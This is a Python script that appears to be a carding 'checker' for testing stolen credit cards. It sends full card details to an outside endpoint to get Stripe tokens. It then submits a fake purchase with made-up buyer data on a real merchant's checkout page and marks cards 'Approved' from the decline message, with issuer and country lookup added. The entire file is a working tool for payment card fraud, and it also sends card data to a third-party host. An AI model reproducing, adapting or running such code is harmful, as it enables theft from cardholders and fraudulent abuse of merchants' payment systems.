import requests
import re
import time

def check_card(card_details):
    start_time = time.time()  
    first_url = f"https://astrer.tech/chk/stccn.php?card={card_details}"
    response = requests.get(first_url)

    if response.status_code == 200:
        try:
            data = response.json()
            nonce = data.get("nonce")
            attr = data.get("attr")
            pm_id = data.get("pm_id")

            if not nonce or not attr or not pm_id:
                return "❌ Api Dead."

            
            bin_number = card_details.split("|")[0][:6]
            bin_data = requests.get(f"https://lookup.binlist.net/{bin_number}").json()
            
            card_brand = bin_data.get("scheme", "Bilinmiyor").upper()
            card_type = bin_data.get("type", "Bilinmiyor").upper()
            card_category = bin_data.get("brand", "Bilinmiyor").upper()
            issuer = bin_data.get("bank", {}).get("name", "Bilinmiyor")
            country = bin_data.get("country", {}).get("name", "Bilinmiyor")
            flag = bin_data.get("country", {}).get("emoji", "🏳️")

           
            second_url = "https://growthhackyourcareer.com/resume-masterclass-checkout/"
            payload = {
                "s2member_pro_stripe_checkout[coupon]": "",
                "s2member_pro_stripe_checkout[first_name]": "alat",
                "s2member_pro_stripe_checkout[last_name]": "baba",
                "s2member_pro_stripe_checkout[email]": "discordol123a@gmail.com",
                "s2member_pro_stripe_checkout[username]": "astrer3101",
                "stripe_pm_id": pm_id,
                "stripe_pi_id": "",
                "stripe_seti_id": "",
                "stripe_sub_id": "",
                "stripe_pi_secret": "",
                "stripe_seti_secret": "",
                "s2member_pro_stripe_checkout[street]": "alat",
                "s2member_pro_stripe_checkout[city]": "baku",
                "s2member_pro_stripe_checkout[state]": "absheron",
                "s2member_pro_stripe_checkout[zip]": "01010",
                "s2member_pro_stripe_checkout[country]": "US",
                "s2member_pro_stripe_checkout[nonce]": nonce,
                "s2member_pro_stripe_checkout[attr]": attr
            }

            headers = {
                "Cache-Control": "max-age=0",
                "Sec-Ch-Ua": '"Not A(Brand";v="8", "Chromium";v="132", "Android WebView";v="132"',
                "Sec-Ch-Ua-Mobile": "?1",
                "Sec-Ch-Ua-Platform": '"Android"',
                "Origin": "https://growthhackyourcareer.com",
                "Content-Type": "application/x-www-form-urlencoded",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "X-Requested-With": "mark.via.gp",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Referer": "https://growthhackyourcareer.com/resume-masterclass-checkout/",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"
            }

            cookies = {
                "__stripe_mid": "7be83e83-b35b-48ec-8962-d76b644341bef9f70c",
                "__stripe_sid": "c9cf794f-b97a-4ba4-a5c7-de94c25835455d418d"
            }

            response2 = requests.post(second_url, data=payload, headers=headers, cookies=cookies)
            response_text = response2.text

            elapsed_time = round(time.time() - start_time, 2) 
            match = re.search(r'<div id="s2member-pro-stripe-form-response".*?>(.*?)</div>', response_text, re.DOTALL)
            if match:
                error_message = match.group(1).strip()
                result_status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

                if "insufficient funds" in error_message:
                    result_status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                elif "incorrect_cvc" in error_message:
                    result_status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"

                return f"""
{result_status}

𝗖𝗮𝗿𝗱: {card_details}
𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe 99$
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message}

𝗜𝗻𝗳𝗼: {card_brand} - {card_type} - {card_category}
𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag}

𝗧𝗶𝗺𝗲: {elapsed_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
ᥫ᭡ 𝙗𝙤𝙩 @M77SaLah
"""
            else:
                return "Good"

        except ValueError:
            return "❌ Json For Mat."
    else:
        return f"❌ API Status Code: {response.status_code}"
#Card Format xxxxxxxxxxxxxxxx|xx|xx|xxx
print('Code By: @M77SaLah')
Card=input('Eeter Card: ')
print(check_card(Card))